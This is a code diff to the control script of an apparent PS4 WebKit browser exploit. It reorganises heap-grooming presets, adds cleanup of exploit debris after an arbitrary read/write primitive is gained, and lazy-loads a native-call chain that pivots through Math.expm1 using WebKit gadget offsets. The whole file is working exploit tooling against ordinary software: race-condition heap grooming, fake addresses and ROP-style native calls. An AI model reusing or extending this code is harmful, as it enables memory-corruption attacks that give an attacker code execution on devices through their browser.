@@ -1,10 +1,10 @@
 import { int64 } from "./int64.js";
 import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
 import { installWindowP, pairStatus } from "./mem.js";
-import { initNativeCall } from "./native_call.js";
+import { groomBootLine, wireGroomBar } from "./groom_presets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250827c";
+const BUILD_ID = "rw-20250827d";
 /** Skip heavy pointer map on Start unless ?rwproof=1 (saves memory for native call) */
 const SKIP_RW_PROOF = params.get("rwproof") !== "1";
 const HW_GADGETS_1352 = {
@@ -30,69 +30,6 @@ let lengthMissStreak = 0;
 
 const LOG_MAX = 300;
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;
-
-const GROOM_PRESETS = {
-    default: { g: [] },
-    lite: { g: ["drain:256", "drainsz:32768", "slab:2097152"] },
-    "384": { g: ["drain:384", "drainsz:32768", "slab:2097152"] },
-    "512": { g: ["drain:512", "drainsz:32768", "slab:2097152"] },
-    max: {
-        g: [
-            "drain:512", "drainsz:65536", "slab:4194304",
-            "bfly:528384", "early:458752", "guard:589824",
-            "pred:524288", "final:524288",
-        ],
-    },
-};
-
-function currentGroomKey() {
-    const gs = params.getAll("g");
-    if (gs.length === 0) return "default";
-    for (const key of Object.keys(GROOM_PRESETS)) {
-        if (key === "default") continue;
-        const preset = GROOM_PRESETS[key];
-        if (preset.g.length !== gs.length) continue;
-        let match = true;
-        for (let i = 0; i < preset.g.length; i++) {
-            if (gs[i] !== preset.g[i]) { match = false; break; }
-        }
-        if (match) return key;
-    }
-    return "custom";
-}
-
-function groomBootLine() {
-    const key = currentGroomKey();
-    const gs = params.getAll("g");
-    if (key === "custom") return "groom=custom (" + gs.join(", ") + ")";
-    if (key === "default") return "groom=default (core 384 drain)";
-    return "groom=" + key;
-}
-
-function reloadWithGroomPreset(key) {
-    const preset = GROOM_PRESETS[key];
-    if (!preset) return;
-    const url = new URL(location.href);
-    url.searchParams.delete("g");
-    url.searchParams.delete("slots");
-    for (let i = 0; i < preset.g.length; i++)
-        url.searchParams.append("g", preset.g[i]);
-    location.href = url.toString();
-}
-
-function wireGroomBar() {
-    const key = currentGroomKey();
-    const nodes = document.querySelectorAll("[data-groom]");
-    for (let i = 0; i < nodes.length; i++) {
-        const el = nodes[i];
-        el.classList.toggle("active", el.getAttribute("data-groom") === key);
-        el.addEventListener("click", function () {
-            if (busy) return;
-            const k = el.getAttribute("data-groom");
-            if (k) reloadWithGroomPreset(k);
-        });
-    }
-}
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
 let btnStart, btnRefresh, btnNative, btnPeek, btnClear;
@@ -311,6 +248,27 @@ function resolveWebkitBase(off, nativeFn) {
     return null;
 }
 
+async function freeAfterPrimitive() {
+    retained.length = 0;
+    if (lines.length > 4) {
+        lines.splice(0, lines.length - 4);
+        if (outEl) outEl.textContent = lines.join("\n");
+    }
+    try {
+        if (!exploit) {
+            const core = await import("./core.js");
+            exploit = {
+                establishPrimitive: core.establishPrimitive,
+                installWindowP,
+                trimExploitDebris: core.trimExploitDebris,
+            };
+        }
+        if (exploit.trimExploitDebris)
+            exploit.trimExploitDebris();
+    } catch (_) { }
+    await new Promise(r => setTimeout(r, 128));
+}
+
 async function freeBeforeNative() {
     retained.length = 0;
     pointers.length = 0;
@@ -354,6 +312,7 @@ async function runNativeCall() {
             nativeChain = null;
         }
         mark("NATIVE-TRY", "base=" + webkitBase + " build=" + BUILD_ID + " (trust, lite)");
+        const { initNativeCall } = await import("./native_call.js");
         const chain = initNativeCall(p, off, {
             webkitBase,
             nativeFn,
@@ -388,7 +347,7 @@ async function runNativeCall() {
 
 async function loadExploit() {
     if (exploit) return exploit;
-    mark("LOAD", "core.js + mem.js + native_call.js");
+    mark("LOAD", "core.js + mem.js");
     const core = await import("./core.js");
     exploit = {
         establishPrimitive: core.establishPrimitive,
@@ -421,7 +380,7 @@ function onRaceEvent(tag, detail) {
             mark("HINT-GROOM", "COMPOSITION-LENGTH-MISS = race lost — tap 512 drain or max groom, close browser, reload");
     }
 
-    if (tag === "READ-PRIMITIVE-PASS")
+    if (tag === "READ-PRIMITIVE-PASS" || tag === "PRIMITIVE-OK")
         lengthMissStreak = 0;
 }
 
@@ -533,6 +492,8 @@ async function runStart() {
         mark("PRIMITIVE-OK", "arb rw live");
         mark("PAIR-STATUS", "state=" + pairStatus.state);
 
+        await freeAfterPrimitive();
+
         const off = loadEffectiveOff();
         if (SKIP_RW_PROOF) {
             seedNativeSession(p, off);
@@ -624,16 +585,16 @@ function init() {
         });
     }
 
-    if (params.has("g")) mark("BOOT", "groom=" + params.getAll("g").join(","));
-    else mark("BOOT", groomBootLine());
     mark("BOOT", "build=" + BUILD_ID + " — native call via Math.expm1 pivot");
+    mark("BOOT", "index_rw.html — same groom bar as cal (384 drain default)");
+    mark("BOOT", groomBootLine(params));
     mark("BOOT", "one establishPrimitive run — internal auto-retry until win");
     window.addEventListener("beforeunload", function () {
         if (nativeChain) try { nativeChain.disarm(); } catch (_) { }
     });
-    wireGroomBar();
+    wireGroomBar(() => busy);
     setUi();
-    state("ready — pick groom if race keeps missing, then Start", "");
+    state("ready — pick groom if needed, then Start", "");
 }
 
 function bootUi() {
